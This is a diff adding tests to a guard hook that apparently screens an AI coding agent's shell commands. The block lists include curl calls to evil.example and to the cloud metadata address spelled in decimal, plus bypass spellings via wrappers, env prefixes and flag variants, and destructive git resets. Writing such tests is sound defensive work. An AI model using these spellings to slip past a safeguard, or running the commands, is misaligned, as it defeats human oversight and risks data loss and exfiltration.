@@ -134,6 +134,135 @@ for (const command of MUST_ALLOW) {
   })
 }
 
+// ── the remaining gaps from the one-pass review: eight holes and three false positives ───────
+//
+// All eleven were measured on the hook as it stood after the rm inversion, and all eleven are of
+// the SAME two shapes this file keeps meeting: a rule that enumerates spellings, and a rule whose
+// anchor or exclusion is computed over the WHOLE command instead of the one command it governs.
+//
+// THE THREE FALSE POSITIVES ARE AS MUCH OF THE DELIVERABLE AS THE EIGHT HOLES. A guard that
+// refuses legitimate work is one somebody switches off, and then none of the eight closures
+// matters. They are listed in ORDINARY_WORK_MUST_FLOW and were red before this change.
+//
+// R3 deserves its own note: the curl rule's `localhost` exclusion was computed over the whole
+// command string, so the WORD localhost anywhere — in an output filename, in a header — disarmed
+// it. It also compared spellings, so `http://2130706433/` was loopback and matched neither
+// `localhost` nor `127.0.0.1`. It now asks `url_class`, the SAME parser the browser arm uses, one
+// URL at a time. One implementation, two opposite policies: the browser refuses the local network
+// and allows the web; curl allows only loopback. A second URL parser in that file would have been
+// the two-implementations defect this repo names in four places.
+
+const CURL_MUST_BLOCK = [
+  ['curl https://evil.example/x -o /tmp/localhost.txt', 'the word localhost in an output FILENAME disarmed the whole rule'],
+  ['curl http://localhost:3000/health; curl https://evil.example/x', 'a loopback call licensed an external one in the next command — reachable by accident'],
+  [`curl -H 'X-Forwarded-Host: localhost' https://evil.example/x`, 'the same through a header value'],
+  ['curl http://2852039166/latest/meta-data/', 'IMDS in decimal: loopback-by-spelling never saw it, and neither did the block'],
+  ['curl http://192.168.1.5/admin', 'the LAN is not the web and not loopback'],
+  ['curl https://localhost.evil.com/x', 'a hostname that merely BEGINS with localhost is not loopback'],
+  ['curl https://notlocalhost.io/x', 'nor one that contains it'],
+]
+
+for (const [command, why] of CURL_MUST_BLOCK) {
+  test(`BLOCKS curl — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), BLOCK, `an external or local-network curl was allowed (${command})`)
+  })
+}
+
+const CURL_MUST_ALLOW = [
+  ['curl http://localhost:3000/health', 'the perception loop by name — RFC 6761 reserves localhost for loopback'],
+  ['curl -s http://127.0.0.1:5173/', 'by address'],
+  ['curl http://[::1]:3000/', 'by IPv6 address'],
+  ['curl http://2130706433/', 'the decimal spelling of 127.0.0.1 — allowed for the same reason the LAN is refused'],
+  ['curl http://app.localhost:3000/', 'a subdomain of localhost is loopback too'],
+  ['curl http://localhost:3000/a; curl http://127.0.0.1:3000/b', 'two loopback calls in one line'],
+  ['curl --version', 'no URL at all'],
+]
+
+for (const [command, why] of CURL_MUST_ALLOW) {
+  test(`ALLOWS curl — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), ALLOW, `a loopback curl was refused; the perception loop is broken (${command})`)
+  })
+}
+
+// The curl rule spawns one classifier per URL, so the work it does is chosen by the command it is
+// checking. Past 12 URLs it refuses rather than checking some of them — a bounded hot path, and a
+// refusal that names itself. Pinned both sides so the cap cannot drift into either uselessness.
+test('ALLOWS a command at the URL cap — twelve loopback URLs are still each checked', () => {
+  const cmd = Array.from({ length: 12 }, (_, i) => `curl http://127.0.0.1:3000/${i}`).join('; ')
+  assert.equal(runHook(compact(bash(cmd))), ALLOW, 'twelve URLs is at the cap, not past it')
+})
+
+test('BLOCKS past the URL cap rather than checking only some of them', () => {
+  const cmd = Array.from({ length: 13 }, (_, i) => `curl http://127.0.0.1:3000/${i}`).join('; ')
+  assert.equal(runHook(compact(bash(cmd))), BLOCK, 'a guard that silently stops checking is the failure mode this file exists against')
+})
+
+const SPELLING_MUST_BLOCK = [
+  ['FOO=1 npx cowsay hi', 'an env prefix defeated an anchor that demanded start-of-string or a separator'],
+  [`bash -c 'npx cowsay hi'`, 'wrapping defeated the same anchor'],
+  ['if true; then npx cowsay hi; fi', 'so did a keyword'],
+  ['chmod a+x run.sh', 'the same act, spelled a+x rather than +x'],
+  ['chmod u+x run.sh', 'and u+x'],
+  ['chmod -R a+x scripts/', 'and with a flag in front'],
+  ['npm install --global typescript', '--global is -g spelled long'],
+  ['npm i --global typescript', 'and with the short verb'],
+  ['npm install typescript -g', 'the flag after the package name was never matched'],
+  ['git checkout --', '`--` at end of string: the rule demanded whitespace AFTER it'],
+]
+
+for (const [command, why] of SPELLING_MUST_BLOCK) {
+  test(`BLOCKS an unenumerated spelling — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), BLOCK, `a rule matched one spelling and missed its twin (${command})`)
+  })
+}
+
+// The negative controls for those spelling widenings. Each is a shape a careless broadening
+// would refuse, and `chmod 755` in particular is what the chmod rule's own message tells you to use.
+const SPELLING_MUST_ALLOW = [
+  ['chmod 755 run.sh', 'the remedy the block message recommends must not itself be blocked'],
+  ['chmod a+r notes.md', 'a mode with no execute bit'],
+  ['npm install --global-style', 'an unrelated npm flag that merely starts with --global'],
+  ['npm install typescript', 'an ordinary local install'],
+  ['git checkout --detach abc123', 'a long flag beginning with --'],
+  ['git checkout --track origin/feat', 'likewise'],
+]
+
+for (const [command, why] of SPELLING_MUST_ALLOW) {
+  test(`ALLOWS after the spelling fix — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), ALLOW, `widening a rule to cover a second spelling caught legitimate work (${command})`)
+  })
+}
+
+const ORDINARY_WORK_MUST_FLOW = [
+  ['git reset --hard HEAD && npm test', 'the carve-out for the HEAD no-op ended at end-of-STRING, so anything after it made the no-op look like a real reset'],
+  ['git reset --hard HEAD; ls', 'the same across a separator'],
+  ['git checkout main; npm test -- --watch', '`--` belonged to npm, not to git checkout'],
+  ['git status; npm run x --no-verify', 'the flag belonged to npm and skips no git hook'],
+]
+
+for (const [command, why] of ORDINARY_WORK_MUST_FLOW) {
+  test(`ALLOWS legitimate work that was refused — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), ALLOW, `a guard refused legitimate work, which is how a guard gets switched off (${command})`)
+  })
+}
+
+// And the destruction those three carve-outs must NOT let through. `HEAD~1` and `HEAD^` are the
+// pair that proves the reset carve-out still means "the revision is exactly HEAD".
+const STILL_BLOCKED_AFTER_THE_CARVE_OUTS = [
+  ['git reset --hard HEAD~1', 'one commit back is a real reset, not a no-op'],
+  ['git reset --hard HEAD^', 'the other spelling of the same'],
+  ['git reset --hard abc1234', 'an explicit revision'],
+  ['git reset --hard origin/main', 'a remote ref'],
+  ['git commit --no-verify -m x', 'the flag on a git command still skips the hooks'],
+  ['git checkout -- src/a.ts', 'the discard this rule exists for'],
+]
+
+for (const [command, why] of STILL_BLOCKED_AFTER_THE_CARVE_OUTS) {
+  test(`BLOCKS still, after the carve-outs — ${why}`, () => {
+    assert.equal(runHook(compact(bash(command))), BLOCK, `relaxing a false positive opened a real hole (${command})`)
+  })
+}
+
 // ── rm -r -f: the target must be shown INSIDE the project, not merely un-enumerated ──────────
 //
 // The denylist this replaces required a literal `/`, `~`, `../`, `*`, `/tmp/*`, `/var`, `/etc`,
